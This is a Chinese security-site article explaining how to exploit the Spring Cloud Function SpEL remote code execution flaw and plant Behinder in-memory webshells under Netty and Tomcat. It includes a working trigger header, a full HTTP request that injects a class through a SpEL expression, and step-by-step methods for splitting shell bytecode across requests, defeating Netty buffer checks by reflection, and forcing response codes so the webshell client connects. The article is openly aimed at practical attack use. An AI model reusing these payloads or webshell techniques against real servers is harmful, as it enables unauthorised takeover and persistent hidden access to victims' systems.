# Netty和Tomcat环境下给Spring Cloud Function Spel RCE注入冰蝎内存马

阅读量 **140763**

|评论 **1**

发布时间 : 2022-05-16 14:31:16

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t0182ae4c7c8faafa5c.jpg)

在Spring Cloud Function SpEL
RCE细节公布后，分析的文章很多，这里不再对漏洞进行分析，一直以来的习惯就是对漏洞进行包装，Java中能RCE的漏洞尽量都注入冰蝎/哥斯拉/蚁剑内存马，而不是满足于简单的回显或一句话内存马，这样做的好处是大家在实战利用的过程中更加方便，提升效率。这篇文章记录了漏洞包装的过程中克服的一些难点——无session情况下的冰蝎连接及Netty下通过Header头获取POST的body内容。

文章可分为三部分：  
1.漏洞复现  
2.Spring Cloud Function在Netty下如何注入冰蝎内存马  
3.Spring Cloud Function在Tomcat下如何注入冰蝎内存马

改版后的冰蝎已经上传至GitHub：  
<https://github.com/shuimuLiu/Behinder-Base65>

## 影响版本

3 <= Version <= 3.2.2（commit dc5128b之前）

## 漏洞复现

**漏洞环境：**  
<https://github.com/spring-cloud/spring-cloud-function/releases/tag/v3.2.0>

**漏洞触发的URL** ：/functionRouter

**Header头加数据：** spring.cloud.function.routing-expression:
T(java.lang.Runtime).getRuntime().exec(“calc”)

![](https://p3.ssl.qhimg.com/t0181f887c6e7be2394.png)

弹出计算器

![](https://p2.ssl.qhimg.com/t01a551b302c1da42f5.png)

## Netty内存马适配

####  单命令回显内存马

这个漏洞适配内存马的不同点是payload在header头中触发的，照抄c0ny1师傅的payload如下：

`{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new
javax.management.loading.MLet(new
java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}`

当直接把这个payload放入到header头的时候，由于header头过大导致报错

![](https://p4.ssl.qhimg.com/t011b21e5ff67b81774.png)

通过报错信息看到header的大小不能超过8192字节

![](https://p1.ssl.qhimg.com/t019d9ef5d948bc4001.png)

通过和众多师傅交流，对变量名做出缩短（这是最简单的一种，但是我还没有实现4ra1n师傅的方法，从asm等角度缩小payload），Demo如下：

![](https://p0.ssl.qhimg.com/t014a403c1e74476401.png)

![](https://p2.ssl.qhimg.com/t01b14e621117ea3013.png)

base64编码后的大小

![](https://p2.ssl.qhimg.com/t01d55723fe52471bb9.png)

发送注册netty handler的数据包

![](https://p1.ssl.qhimg.com/t01f5a6550ba61bc1d7.png)

数据包如下：

`POST /functionRouter HTTP/1.1  
Host: 127.0.0.1:8080  
Accept: */*  
spring.cloud.function.routing-expression:
{T(org.springframework.cglib.core.ReflectUtils).defineClass('m',T(org.springframework.util.Base64Utils).decodeFromString('xxx'),new
javax.management.loading.MLet(new
java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 0`

执行命令

![](https://p5.ssl.qhimg.com/t016c9a180b12ede3f4.png)

####  冰蝎内存马

虽然function的netty一句话内存马已经有了，打起来还是冰蝎方便些，因为Header头不能过大，所以这里选择的方案是通过线程获取到post的body，然后对body中的class进行反射调用，通过Java-Object-Searcher工具这里找到了内存中存储body的信息位置-io.netty.handler.codec.http.DefaultLastHttpContent

![](https://p1.ssl.qhimg.com/t01071eb10e9983ab81.png)

实现的Demo如下：

![](https://p5.ssl.qhimg.com/t0165254ab0d024cfe6.png)

在找到了存储body位置的信息之后，发现这里只能保存不超过8192字节的数据，那么这里想出的解决方案，是把将要在类中运行的字节码base64编码之后保存在三个类中，这个时候需要发送三次数据包，然后，最后一个数据包将前三个类中保存的base64字符串解码，注入到内存中

![](https://p2.ssl.qhimg.com/t01b2e723ca91316df7.png)

当然，这只是我的思路，实现起来还是要考虑程序具体的执行情况，主要是下面的三个问题

**第一个问题**

字符串发送到服务端后，服务端接收的字节大小是没有问题的，问题是无法读取字节信息，即DefaultLastHttpContent的readBytes方法出现了问题，随即debug跟进，实际上这里的readBytes是调用父类AbstractByteBuf的方法，接着跟进checkReadableBytes

![](https://p0.ssl.qhimg.com/t012fb93477b9451f77.png)

跟进checkReadableBytes方法到AbstractByteBuf.checkReadableBytes0方法

![](https://p0.ssl.qhimg.com/t011308678d2f1e5532.png)

这里调用ensureAccessible方法对是否可以读取字节内容进行了校验

![](https://p3.ssl.qhimg.com/t018797ac513cf2f3f9.png)

跟进isAccessible方法

![](https://p3.ssl.qhimg.com/t01e98ade3f9a74839d.png)

这里如果refCnt的值为1，那么会无法读取到字节

![](https://p1.ssl.qhimg.com/t0125db49f5b509d909.png)

异常信息如下：

![](https://p2.ssl.qhimg.com/t010ce60c8ed828df8a.png)

那么反射把它的值改为2，这样就不会返回异常信息，Demo如下：

![](https://p3.ssl.qhimg.com/t01b78c956450b34ce8.png)

**第二个问题**

在完成了第一校验之后，发现还是无法读取到字节信息，于是接着跟进，在修改了一次RefCnt的值之后checkReadableBytes方法通过了校验

![](https://p3.ssl.qhimg.com/t014057a3ffeed2d299.png)

那么问题应该是出在了getBytes方法这里

![](https://p5.ssl.qhimg.com/t010ea19dcc08f60b31.png)

跟进checkIndex0方法，发现这个方法中没有出现异常

![](https://p2.ssl.qhimg.com/t01b4ef9c7142134fe1.png)

于是跟进this.unwrap().getBytes方法

![](https://p0.ssl.qhimg.com/t017a69c07ca8194524.png)

终于在UnsafeByteBufUtil类的getBytes方法这里找到了校验方法（ensureAccessible）的调用

![](https://p3.ssl.qhimg.com/t0109280acd857840cc.png)

![](https://p1.ssl.qhimg.com/t01e14b88e3494b76a9.png)

现在需要确定的点就是RefCnt在第二次校验的时候值是多少，发现其值为1

![](https://p1.ssl.qhimg.com/t01029a4bbc92c41aa6.png)

那么还是解决第一个问题的方法，修改refCnt的值，这里需要注意的第二次refCnt所属的对象类为PooledUnsafeDirectByteBuf，第一次refCnt所属的对象类为PooledSlicedByteBuf，而第二次refCnt所属的对象存储在第一次refCnt所属的对象类的rootParent变量中

![](https://p2.ssl.qhimg.com/t01134e0d91071b2ebe.png)

![](https://p3.ssl.qhimg.com/t01608a0a13601112f2.png)

所以此时的思路就是先获取到rootParent变量所存储的对象，然后修改refCnt的值，修改之后就可以读取到字节信息了，整体实现的Demo如下：

![](https://p2.ssl.qhimg.com/t01879b817429b0758e.png)

![](https://p1.ssl.qhimg.com/t012b1fe92e7ce208d3.png)

![](https://p4.ssl.qhimg.com/t01537fa8722c549873.png)

冰蝎马的实现Demo如下：

![](https://p3.ssl.qhimg.com/t01c0a9c1229a7634bf.png)

![](https://p3.ssl.qhimg.com/t010a194c05c3044ebe.png)

![](https://p5.ssl.qhimg.com/t012f9e60b980225ac7.png)

![](https://p5.ssl.qhimg.com/t01b45a9cc86f5f9a1f.png)

![](https://p2.ssl.qhimg.com/t015d5ce5ade2468c31.png)

实现存储内存马的分段类Demo如下：

![](https://p0.ssl.qhimg.com/t012c169ef9585dc72a.png)

![](https://p2.ssl.qhimg.com/t018fd00cb34f294b3b.png)

![](https://p5.ssl.qhimg.com/t011c204792a54ea1b9.png)

整合冰蝎马内存信息的类Demo如下：

![](https://p1.ssl.qhimg.com/t01844eed0a3d296cd0.png)

![](https://p5.ssl.qhimg.com/t0131c6e2a5c8684192.png)

![](https://p5.ssl.qhimg.com/t01ea1bfdba331a8181.png)

![](https://p4.ssl.qhimg.com/t01ea8645d05bfac1c7.png)

![](https://p4.ssl.qhimg.com/t01df092216d15643e6.png)

**第三个问题**

冰蝎连接时候不成功，执行单命令回显却成功？

在使用上述方法注入冰蝎马之后并不成功，注入单命令回显的内存马却成功

![](https://p0.ssl.qhimg.com/t01e16d9a8bdb2b5692.png)

经过对比发现

![](https://p5.ssl.qhimg.com/t01f2a3365712a65a2f.png)

是Content-Type的原因，如果使用application/x-www-form-urlencoded方式，冰蝎马是可以连接的

![](https://p4.ssl.qhimg.com/t0171803818ef63039e.png)

## Tomcat下Spring内存马的注入

Netty在国内使用是否普遍不确定，但是在Tomcat下Spring是真的多

####  request如何获取body中的内容

gateway的不用多说，对于function的内存马，主要是header头大小问题，思路是通过header头中的代码获取body，经过和众多师傅交流，发现如果是在Tomcat下起的Spring环境（这也是国内的现状），那么可以通过T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getRequest().getParameter(“a”)可以获取到POST
body中的a参数内容

![](https://p4.ssl.qhimg.com/t011a37422555d45b0d.png)

####  冰蝎内存马

对于内存马的注入这里我们可以考虑注入spring的Interceptor内存马，因为之前LandGrey师傅已经提出过Demo这里直接使用就好了

首先是Interceptor的Demo，源代码如下：

![](https://p1.ssl.qhimg.com/t0142638bd579c8188a.png)

![](https://p0.ssl.qhimg.com/t0120182e7970002be6.png)

注入Interceptor的代码如下：

![](https://p4.ssl.qhimg.com/t01b72db4aed7910298.png)

![](https://p3.ssl.qhimg.com/t0121ebdd6069e9da05.png)

在实际利用该内存马的时候发现，冰蝎客户端如果收到的状态码是404的话，就不会接收解密，为了不改动客户端，直接在注入内存马的时候将服务端每次response的响应码改为200

![](https://p0.ssl.qhimg.com/t0167dee392d3a2951a.png)

function发送数据包

![](https://p3.ssl.qhimg.com/t018015a58797ced00a.png)

冰蝎连接：

![](https://p4.ssl.qhimg.com/t01b2a20f36dc92883c.png)

## 参考文章

<https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/>  
<https://landgrey.me/blog/19/>  
<https://mp.weixin.qq.com/s/U7YJ3FttuWSOgCodVSqemg>  
<https://xz.aliyun.com/t/10824#toc-4>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **长亭科技** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/273205](/post/id/273205)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhimg.com/t012a2b2cc9165a693a.jpg) 长亭科技

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

